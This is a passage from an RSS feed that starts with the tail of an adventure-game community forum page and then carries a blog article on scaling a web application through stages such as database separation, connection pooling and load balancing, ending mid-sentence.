                                    By: jessejericho <span>(2&nbsp;hours&nbsp;ago)</span>
                                </p>
                            </div>
                    <div id="default-5">
                                
                                <p>
                                    In: Competitions &amp; Activities<br>
                                    By: Rui "Giger Kitty" Pires <span>(5&nbsp;hours&nbsp;ago)</span>
                                </p>
                            </div>
                    <div id="default-6">
                                
                                <p>
                                    In: Competitions &amp; Activities<br>
                                    By: Rui "Giger Kitty" Pires <span>(5&nbsp;hours&nbsp;ago)</span>
                                </p>
                            </div>
                    <div id="default-7">
                                
                                <p>
                                    In: The Rumpus Room<br>
                                    By: Rui "Giger Kitty" Pires <span>(5&nbsp;hours&nbsp;ago)</span>
                                </p>
                            </div>
                    <div id="default-8">
                                
                                <p>
                                    In: Adventure Related Talk &amp; Chat<br>
                                    By: Rik_Vargard <span>(5&nbsp;hours&nbsp;ago)</span>
                                </p>
                            </div>
                </div>
                
            </div>
            <div>
                    <div>
                        <h3>Other community channels</h3>
                        <div>
                            <p>
                                AGS has an active and friendly community, with many ways of keeping in touch and
                                getting help with your project or games made with AGS.
                            </p>
                            <p>
                                These include our local forums, Facebook page, Discord server, in-person meet-ups,
                                and many more.
                            </p>
                        </div>
                        
                    </div>
                    <div>
                        <h3>Donate to the AGS Community</h3>
                        <div>
                            <p>
                                The AGS community is run by a team of dedicated volunteers, who put their time and
                                efforts into keeping it running as a welcoming, friendly and informative place to be.
                                The AGS server and forums are paid for out of our own pockets, so in effect it costs
                                us money to provide a free service to AGS users.
                            </p>
                            <p>
                                If you appreciate the work we do, and would like to give a little something back,
                                please use the below link to donate via PayPal. Any profit made after covering server
                                costs will be put back into hosting community events such as
                                <a href="https://www.adventuregamestudio.co.uk/wiki/Mittens">Mittens</a>.
                            </p>
                            
                        </div>
                    </div>
                </div>
        </div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to Scale a System from 0 to 10M+ Users (130 pts)]]></title>
            <link>https://blog.algomaster.io/p/scaling-a-system-from-0-to-10-million-users</link>
            <guid>46845470</guid>
            <pubDate>Sun, 01 Feb 2026 11:35:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.algomaster.io/p/scaling-a-system-from-0-to-10-million-users">https://blog.algomaster.io/p/scaling-a-system-from-0-to-10-million-users</a>, See on <a href="https://news.ycombinator.com/item?id=46845470">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><span>Scaling is a complex topic, but after working at </span><strong>big tech</strong><span> on services handling millions of requests and scaling my own </span><strong><span>startup (</span><a href="https://algomaster.io/" rel="">AlgoMaster.io</a><span>)</span></strong><span> from scratch, I’ve realized that most systems evolve through a surprisingly similar set of stages as they grow.</span></p><p><span>The key insight is that </span><strong>you should not over-engineer from the start</strong><span>. Start simple, identify bottlenecks, and scale incrementally.</span></p><p><span>In this article, I’ll walk you through </span><strong>7 stages of scaling a system</strong><span> from zero to 10 million users and beyond. Each stage addresses the specific bottlenecks that show up at different growth points. You’ll learn what to add, when to add it, why it helps, and the trade-offs involved.</span></p><p>Whether you’re building an app or website, preparing for system design interviews, or just curious about how large-scale systems work, understanding this progression will sharpen they way you think about architecture.</p><blockquote><p><strong>Note: </strong><span>The user ranges in this article are rough guidelines. The exact thresholds will vary based on your product, workload, and traffic patterns.</span></p></blockquote><p><span>When you’re just starting out, your first priority is simple: </span><strong>ship something and validate your idea</strong><span>. Optimizing too early at this stage wastes time and money on problems you may never face.</span></p><p><span>The simplest architecture puts everything on a </span><strong>single server</strong><span>: your web application, database, and any background jobs all running on the same machine.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!Xhwe!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!Xhwe!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 424w, https://substackcdn.com/image/fetch/$s_!Xhwe!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 848w, https://substackcdn.com/image/fetch/$s_!Xhwe!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 1272w, https://substackcdn.com/image/fetch/$s_!Xhwe!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!Xhwe!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png" width="656" height="390.72100313479626" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:760,&quot;width&quot;:1276,&quot;resizeWidth&quot;:656,&quot;bytes&quot;:64447,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!Xhwe!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 424w, https://substackcdn.com/image/fetch/$s_!Xhwe!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 848w, https://substackcdn.com/image/fetch/$s_!Xhwe!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 1272w, https://substackcdn.com/image/fetch/$s_!Xhwe!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F996b8082-9df2-4e4f-82b2-b1c7d87d7894_1276x760.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><blockquote><p>This is how Instagram started. When Kevin Systrom and Mike Krieger launched the first version in 2010, 25,000 people signed up on day one.</p><p>They didn’t over-engineer upfront. With a small team and a simple setup, they scaled in response to real demand, adding capacity as usage grew, rather than building for hypothetical future traffic.</p></blockquote><p>In practice, a single-server setup means:</p><ul><li><p>A web framework (Django, Rails, Express, Spring Boot) handling HTTP requests</p></li><li><p>A database (PostgreSQL, MySQL) storing your data</p></li><li><p>Background job processing (Sidekiq, Celery) for async tasks</p></li><li><p>Maybe a reverse proxy (Nginx) in front for SSL termination</p></li></ul><p>All of these run on one virtual machine. Your cloud provider bill might be $20-50/month for a basic VPS (DigitalOcean Droplet, AWS Lightsail, Linode).</p><p>At this stage, simplicity is your biggest advantage:</p><ul><li><p><strong>Fast deployment</strong><span>: One server means one place to deploy, monitor, and debug.</span></p></li><li><p><strong>Low cost</strong><span>: A single $20-50/month Virtual Private Server (VPS) can comfortably handle your first 100 users.</span></p></li><li><p><strong>Faster iteration</strong><span>: No distributed systems complexity to slow down development.</span></p></li><li><p><strong>Easier debugging</strong><span>: All logs are in one place, and there are no network issues between components.</span></p></li><li><p><strong>Full-stack visibility</strong><span>: You can trace every request end to end because there’s only one execution path.</span></p></li></ul><p>This simplicity comes with trade-offs you accept knowingly:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!_20S!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!_20S!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 424w, https://substackcdn.com/image/fetch/$s_!_20S!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 848w, https://substackcdn.com/image/fetch/$s_!_20S!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 1272w, https://substackcdn.com/image/fetch/$s_!_20S!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!_20S!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png" width="711" height="221" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:221,&quot;width&quot;:711,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:39074,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!_20S!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 424w, https://substackcdn.com/image/fetch/$s_!_20S!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 848w, https://substackcdn.com/image/fetch/$s_!_20S!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 1272w, https://substackcdn.com/image/fetch/$s_!_20S!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6910b4a2-9e2d-4e75-85aa-0c9c84863481_711x221.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>You’ll know it’s time to evolve when you notice these signs:</p><ul><li><p><strong>Database queries slow down during peak traffic</strong><span>: The app and database compete for the same CPU and memory. One heavy query can drag down API latency for everyone.</span></p></li><li><p><strong>Server CPU or memory consistently exceeds 70-80%</strong><span>: You’re approaching the limits of what a single machine can reliably handle.</span></p></li><li><p><strong>Deployments require restarts and cause downtime</strong><span>: Even short interruptions become noticeable, and users start to complain.</span></p></li><li><p><strong>A background job crash takes down the web server</strong><span>: Without isolation, non-user-facing work can impact the user experience.</span></p></li><li><p><strong>You can’t afford even brief downtime</strong><span>: Your product has become critical enough that even maintenance windows stop being acceptable.</span></p></li></ul><p>At some point, the server starts to struggle under the weight of doing everything. That’s when it’s time for your first architectural split.</p><p data-attrs="{&quot;url&quot;:&quot;https://blog.algomaster.io/p/scaling-a-system-from-0-to-10-million-users?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://blog.algomaster.io/p/scaling-a-system-from-0-to-10-million-users?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p>As traffic grows, your single server starts struggling. The web application and database compete for the same CPU, memory, and disk I/O. A single heavy query can spike latency and slow down every API response.</p><p><span>The first scaling step is simple: </span><strong>separate the database from the application server</strong><span>.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!3Atu!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!3Atu!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 424w, https://substackcdn.com/image/fetch/$s_!3Atu!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 848w, https://substackcdn.com/image/fetch/$s_!3Atu!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 1272w, https://substackcdn.com/image/fetch/$s_!3Atu!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!3Atu!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png" width="670" height="192" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/efc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:192,&quot;width&quot;:670,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:21631,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!3Atu!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 424w, https://substackcdn.com/image/fetch/$s_!3Atu!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 848w, https://substackcdn.com/image/fetch/$s_!3Atu!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 1272w, https://substackcdn.com/image/fetch/$s_!3Atu!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefc4c8c3-9f3a-4233-8564-26bb9ce8c3a0_670x192.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>This two-tier architecture gives you several immediate benefits:</p><ul><li><p><strong>Resource Isolation: </strong><span>Application and database no longer compete for CPU/memory. Each can use 100% of their allocated resources.</span></p></li><li><p><strong>Independent Scaling: </strong><span>Upgrade the database (more RAM, faster storage) without touching the app server.</span></p></li><li><p><strong>Better Security: </strong><span>Database server can sit in a private network, not exposed to the internet.</span></p></li><li><p><strong>Specialized Optimization: </strong><span>Tune each server for its specific workload. High CPU for app server, high I/O for database.</span></p></li><li><p><strong>Backup Simplicity: </strong><span>Database backups don’t affect application performance since they run on a different machine.</span></p></li></ul><p><span>At this stage, most teams use a managed database like </span><strong>Amazon RDS</strong><span>, </span><strong>Google Cloud SQL</strong><span>, </span><strong>Azure Database</strong><span>, or </span><strong>Supabase</strong><span> (I use Supabase at </span><strong><a href="https://algomaster.io/" rel="">algomaster.io</a></strong><span>).</span></p><p>Managed services typically handle:</p><ul><li><p>Automated backups (daily snapshots, point-in-time recovery)</p></li><li><p>Security patches and updates</p></li><li><p>Basic monitoring and alerts</p></li><li><p>Optional read replicas (we’ll cover these later)</p></li><li><p>Failover to standby instances</p></li></ul><p><span>The cost difference between self-hosting and managed is usually small once you factor in engineering time. A managed PostgreSQL instance might cost </span><strong>$50–$100/month more</strong><span> than a raw VM, but it can save hours of maintenance every week. Those hours are better spent shipping features.</span></p><p>The main reasons to self-manage a database are:</p><ul><li><p>Cost optimization at very large scale</p></li><li><p>Specific configurations that managed services don’t support</p></li><li><p>Compliance requirements that prohibit managed services</p></li><li><p>You’re building a database product</p></li></ul><p><span>For most teams, managed services are the right choice until your database bill grows into the </span><strong>thousands of dollars per month</strong><span>.</span></p><p>One often-overlooked improvement at this stage is connection pooling. Each database connection consumes resources:</p><ul><li><p>Memory for the connection state (typically 5-10MB per connection in PostgreSQL)</p></li><li><p>File descriptors on both app and database servers</p></li><li><p>CPU overhead for connection management</p></li></ul><p><span>Opening a new connection is expensive too. Between the TCP handshake, SSL negotiation, and database authentication, you can add </span><strong>50–100 ms</strong><span> of overhead per request.</span></p><p><span>A connection pooler like </span><strong>PgBouncer</strong><span> (for PostgreSQL) keeps a small set of database connections open and reuses them across requests.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!r_Je!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!r_Je!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 424w, https://substackcdn.com/image/fetch/$s_!r_Je!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 848w, https://substackcdn.com/image/fetch/$s_!r_Je!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 1272w, https://substackcdn.com/image/fetch/$s_!r_Je!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!r_Je!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png" width="609" height="317" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/889d79be-870e-4147-8bf5-da46855a4641_609x317.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:317,&quot;width&quot;:609,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:30249,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!r_Je!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 424w, https://substackcdn.com/image/fetch/$s_!r_Je!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 848w, https://substackcdn.com/image/fetch/$s_!r_Je!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 1272w, https://substackcdn.com/image/fetch/$s_!r_Je!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F889d79be-870e-4147-8bf5-da46855a4641_609x317.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>With 1,000 users, you might have 100 concurrent connections hitting your API. Without pooling, that’s 100 database connections consuming resources. With pooling, 20-30 actual database connections can efficiently serve those 100 application connections through connection reuse.</p><p><strong>Connection pooling modes:</strong></p><ul><li><p><strong>Session pooling</strong><span>: One pool connection per client connection (most compatible, least efficient)</span></p></li><li><p><strong>Transaction pooling</strong><span>: Connection returned to the pool after each transaction (best balance for most apps)</span></p></li><li><p><strong>Statement pooling</strong><span>: Connection returned after each statement (most efficient, but can break features)</span></p></li></ul><p><span>Most applications work best with </span><strong>transaction pooling</strong><span>, which often improves connection efficiency by </span><strong>3–5x</strong><span>.</span></p><p>Separating the database introduces network latency. When app and database were on the same machine, “network” latency was essentially zero (loopback interface). Now every query adds 0.1-1ms of network round-trip time.</p><p>For most applications, this is negligible. But if your code makes hundreds of database queries per request (an anti-pattern, but common), this latency adds up. The solution isn’t to put them back on the same machine, but to optimize your query patterns:</p><ul><li><p>Batch queries where possible</p></li><li><p>Use JOINs instead of N+1 query patterns</p></li><li><p>Cache frequently accessed data</p></li><li><p>Use connection pooling to avoid repeated connection setup overhead</p></li></ul><p>With the database on its own server, you’ve bought yourself room to grow. But you’ve also created a new single point of failure: the application server is now the weak link. What happens when it goes down, or when it simply can’t keep up with demand?</p><p><span>Your separated architecture handles load better now, but you’ve introduced a new problem: your single application server is now a </span><strong>single point of failure</strong><span>. If it crashes, your entire application goes down. And as traffic grows, that one server can’t keep up.</span></p><p><span>The next step is to run </span><strong>multiple application servers</strong><span> behind a </span><strong>load balancer</strong><span>.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!2Tb9!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!2Tb9!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 424w, https://substackcdn.com/image/fetch/$s_!2Tb9!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 848w, https://substackcdn.com/image/fetch/$s_!2Tb9!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 1272w, https://substackcdn.com/image/fetch/$s_!2Tb9!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!2Tb9!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png" width="725" height="511" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:511,&quot;width&quot;:725,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:44711,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!2Tb9!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 424w, https://substackcdn.com/image/fetch/$s_!2Tb9!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 848w, https://substackcdn.com/image/fetch/$s_!2Tb9!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 1272w, https://substackcdn.com/image/fetch/$s_!2Tb9!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F329f47dd-6c66-4c66-b973-487ef28e77de_725x511.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The load balancer sits in front of your servers and distributes incoming requests across them. If one server fails, the load balancer detects this (via health checks) and routes traffic only to healthy servers. Users experience no downtime when a single server fails.</p><p><span>The load balancer needs to decide which server handles each request. Common algorithms include: </span><strong>Round Robin</strong><span>, </span><strong>Weighted Round Robin</strong><span>, </span><strong>Least Connections</strong><span>, </span><strong>IP Hash</strong><span>, and </span><strong>Random</strong><span>.</span></p><p>Most teams start with Round Robin (simple, works well for most cases) and switch to Least Connections if they have requests with varying processing times.</p><p>Modern load 